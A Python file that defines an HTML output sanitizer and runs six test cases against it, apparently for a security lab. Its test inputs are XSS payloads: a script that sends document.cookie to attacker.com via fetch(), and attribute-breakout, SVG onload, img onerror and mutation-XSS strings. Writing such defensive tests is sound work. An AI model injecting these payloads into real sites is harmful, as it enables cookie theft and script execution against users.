import html
import re


class WebOutputSanitizer:
    @staticmethod
    def encode_html_text(raw_input: str) -> str:
        if not raw_input:
            return ""

        return html.escape(raw_input, quote=True)

    @staticmethod
    def encode_html_attribute(raw_input: str) -> str:
        if not raw_input:
            return ""

        escaped = html.escape(raw_input, quote=True)

        def hex_match(match):
            char = match.group(0)
            return f"&#x{ord(char):x};"

        return re.sub(r"[^a-zA-Z0-9./_-]", hex_match, escaped)


def display_test(test_number, test_name, raw_input, sanitized, passed):
    print("-" * 70)
    print(f"TEST CASE {test_number}: {test_name}")
    print("-" * 70)
    print(f"RAW INPUT: {raw_input}")
    print(f"SANITIZED: {sanitized}")
    print(f"RESULT: {'PASS' if passed else 'FAIL'}")
    print("-" * 70)


def run_security_test():
    print("-" * 70)
    print("INITIALIZING XSS DEFENSE SECURITY TESTS")
    print("-" * 70)

    sanitizer = WebOutputSanitizer()
    passed_tests = 0
    total_tests = 6

    # Test Case 1: Stored XSS
    malicious_stored = (
        "<script>"
        "fetch('http://attacker.com/steal?cookie=' + document.cookie)"
        "</script>"
    )

    safe_stored = sanitizer.encode_html_text(malicious_stored)
    passed = "<script>" not in safe_stored

    if passed:
        passed_tests += 1

    display_test(
        1,
        "Stored XSS Script Injection",
        malicious_stored,
        safe_stored,
        passed
    )

    # Test Case 2: Attribute Breakout XSS
    malicious_attribute = '" onmouseover="alert(1)'
    safe_attribute = sanitizer.encode_html_attribute(malicious_attribute)

    passed = (
        '"' not in safe_attribute
        and " " not in safe_attribute
        and "=" not in safe_attribute
    )

    if passed:
        passed_tests += 1

    display_test(
        2,
        "HTML Attribute Breakout",
        malicious_attribute,
        safe_attribute,
        passed
    )

    # Test Case 3: SVG-based XSS
    malicious_svg = "<svg onload=alert('XSS')></svg>"
    safe_svg = sanitizer.encode_html_text(malicious_svg)

    passed = "<svg" not in safe_svg

    if passed:
        passed_tests += 1

    display_test(
        3,
        "SVG Event Handler XSS",
        malicious_svg,
        safe_svg,
        passed
    )

    # Test Case 4: Image Error Handler XSS
    malicious_image = "<img src=x onerror=alert(1)>"
    safe_image = sanitizer.encode_html_text(malicious_image)

    passed = "<img" not in safe_image

    if passed:
        passed_tests += 1

    display_test(
        4,
        "Image Error Handler XSS",
        malicious_image,
        safe_image,
        passed
    )

    # Test Case 5: Mutation XSS (mXSS)
    malicious_mxss = (
        "<math><mtext></math>"
        "<img src=x onerror=alert('mXSS')>"
    )

    safe_mxss = sanitizer.encode_html_text(malicious_mxss)

    passed = (
        "<math" not in safe_mxss
        and "<img" not in safe_mxss
    )

    if passed:
        passed_tests += 1

    display_test(
        5,
        "Parser-Sensitive Mutation XSS",
        malicious_mxss,
        safe_mxss,
        passed
    )

    # Test Case 6: Normal Input
    normal_input = "Welcome to the IRSP security lab."
    safe_normal = sanitizer.encode_html_text(normal_input)

    passed = safe_normal == normal_input

    if passed:
        passed_tests += 1

    display_test(
        6,
        "Normal User Input",
        normal_input,
        safe_normal,
        passed
    )

    print("\n" + "-" * 70)
    print("XSS SECURITY TEST SUMMARY")
    print("-" * 70)
    print(f"TOTAL TESTS: {total_tests}")
    print(f"PASSED: {passed_tests}")
    print(f"FAILED: {total_tests - passed_tests}")

    if passed_tests == total_tests:
        print("FINAL RESULT: ALL TESTS PASSED")
    else:
        print("FINAL RESULT: SOME TESTS FAILED")

    print("-" * 70)


run_security_test()